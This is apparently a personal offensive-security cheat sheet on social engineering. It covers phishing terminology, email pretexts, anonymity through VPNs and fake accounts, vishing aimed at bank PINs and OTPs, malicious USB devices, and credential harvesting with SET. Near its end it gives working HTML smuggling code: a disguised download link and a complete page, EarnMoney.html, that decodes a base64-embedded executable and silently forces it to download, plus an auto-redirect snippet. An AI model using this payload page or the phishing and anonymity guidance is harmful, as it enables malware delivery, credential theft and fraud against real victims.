Social Engineering:
==================
Basics:
	Social Engineering:(SE)
		It refers to manipulating a target into trusting the attacker and then abusing that that trust by sending an attack vector, aka Social Engineering Attack Vector.
	Terms:
		Client-Side Attacks:
			The attacks which require target interaction.
			Client-Side attacks and SE go hand in hand.
SE Communication:(SE Manipulation)
	Basics:
	PreText:
		Basics:
			It refers to text/images/etc included in a vector such as an email or a malicious file that makes the victim trust the attacker.
			For Example:
				We have a Torjan now. All we need to do next is beautify and change its apperance, so that the victim allows our Torjan Horse to enter into its PC.
		Types:
			1. Phishing Pre-Text for Emails:
				https://github.com/L4bF0x/PhishingPretexts
					Repo of good email structures.
			2. Phishing Pre-Text for Malicious Site:
				Login Pages:
				Hosting Torjan:
			3. Phishing Pre-Text for Torjan:
				Text/content to put inside the torjan other than payload.
		Making Pretext better:
			1. Avoid spelling and grammar mistakes and make sure the content matches the style of the ruse.
			2. We should also make an effort to make the document look legitimate by including product names and logos the users likely know and trust such as Microsoft or encryption standards like RSA.

	A. Phishing:
		Basics:
			Sending a fake link for login/autherization/authentication/data_retrival like:
				Insta/social media login
				Intranet/Company_pages login
				Google/other forms to submit info
			Biggest Misconception:
				1. Phishing is relatively easy to implement and it doesnt require a lot of preparation:
					Phishing is hard because of security mechanisms.
				2. Social engineering and phishing are different:
					"Phishing is Social Engineering, but' Social Engineering is not Phishing"
					Phishing is a type of social engineering attack.
			Terms:
				Spoofing:
					Spoofing is the act of disguising a communication from an unknown source as being from a known, trusted source.
				Spear Phishing:
					Sending messages impersonating as a trusted source.
				Whaling:
					It refers to spear phishing attacks directed specifically at senior executives and other high-profile targets.
				CEO Fraud:
					Its effectively the opposite of whaling
					It refers to spear phishing attacks directed specifically at employees at an organization to perform a specific action, usually the wiring of money to an offshore account. Here, the attacker impersonates as CEO or senior executives of the organization.
				Typosquatting:(aka URL Hijacking)
					It a phishing technique in which attacker sends a fake url.
		Types:(On Basis on Mode of Communication)
			1. Email Phishing:(Most Common)
				Basics:
					Requirements:
						Email-Id of Targets
						Phishing Pre-Text
					Email Delivery Security Mechanisms:
						Basics:
							They are supposed to reinforce email delivery security and to prevent message spoofing.
							Security Standards:(3)
								A. SPF:(Sender Policy Framework)
								B. DKIM:(DomainKeys Identified Mail)
								C. DMARC:(Domain-based Message Authentication, Reporting and Conformance)
						Bypassing Email Delivery Security Standards:
							Basics:
								Their first weakness is that they are not evenly implemented across the network.
				Maintaining Annonymity:
					Using Personal SMTP Server: Read red-teaming sheet for this
					Using gmail/etc:
						Use VPN to create an account with fake info.
				Phishing Campaign:
					Basics:
						It is mostly used in Red-Teaming
					Setting up Structure:
					Setting up the server:
						Using Metasploit Pro:
							Phishing module:
								It automates the login page creation.
								It also keep tracks of how many users opened email, how many clicked the link, how many typed thier creds
							Note:
								Read Metasploit Sheet to read more.
						Using SET:
							Goto SET -> Social Engineering Attacks -> Website Attack Vectors -> Credential Harvester
							Note:
								Read SET Tool Below to read more.
			2. Voice Phishing:(Vishing)
				Basics:
					It heavily relies on social enginerring skills.
					We try to gain sensitive information such as bank pin/otp/creds. Its mostly used in banking scams.
					Requirements:
						VSIM:
							To create an account on some social media sites such as telegram, we need a number.
					Types:
						Cellular Call:
							Maintaining Anonymity:
						VOIP Call:(Social Media)
				Maintaining Anonymity:
					Make account using VPN with fake details
					Changing Voice:
			3. SMS Phishing:
				Basics:
					Sending Malcious link via SMS.
				Maintaining Anonymity:
			4.  Physical Devices:
				Basics:
				Types:
					USB:
						Plugging USB inside a system into a system inside the organization
						Types:
							Rubber Ducky:
							BadUSB:
							Bash Bunny:
							USBHarpoon:(Malicious Cable)
					LANTurtle:

			Usage:
		Maintaining Anonymity:
	Types:
		Fake login page:
		Hosting Malicious Payload:
			HTML Smuggling:(Making webpage)
				Basics:
					Making the victim download a malicous file.
					Using HTML5:
						We make use of anchor tags to make the victim click the link and execute/download malware inside the browser thus bypassing any firewall in place
						Example:
							<a href="evil.exe" download="innocent.exe">Click Me to Earn Money</a>
					USING JS along with HTML:
						We make use of Array to store our payload on site, and of JS blob to execute it
						Example:
							see EarnMoney.html
				Real-World Usage:
					Step-1: Convert malware to base64 text and copy it
						base64 malc.exe > evil.txt
					Step-2: Make victim open EarnMoney.html
						EarnMoney.html:
							<html>
							    <body>
							        <script>
							            function base64ToArrayBuffer(base64) {
							            var binary_string = window.atob(base64);
							            var len = binary_string.length;
							            
							            var bytes = new Uint8Array( len );
							                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
							                return bytes.buffer;
							            }
							            var file = '<base64 text>';
							            var data = base64ToArrayBuffer(file);
							            var blob = new Blob([data], {type: 'octet/stream'});
							            var fileName = 'evil.exe';
							            if (window.navigator.msSaveOrOpenBlob) {
							                window.navigator.msSaveOrOpenBlob(blob,fileName);
							            } else {
							                var a = document.createElement('a');
							                console.log(a);
							                document.body.appendChild(a);
							                a.style = 'display: none';
							                var url = window.URL.createObjectURL(blob);
							                a.href = url;
							                a.download = fileName;
							                a.click();
							                window.URL.revokeObjectURL(url);
							            }
							        </script>
							    </body>
							</html>
			Auto downloading a file:
				Add either of the following in the phishing page:
					A. <script document.location.href="link";></script>
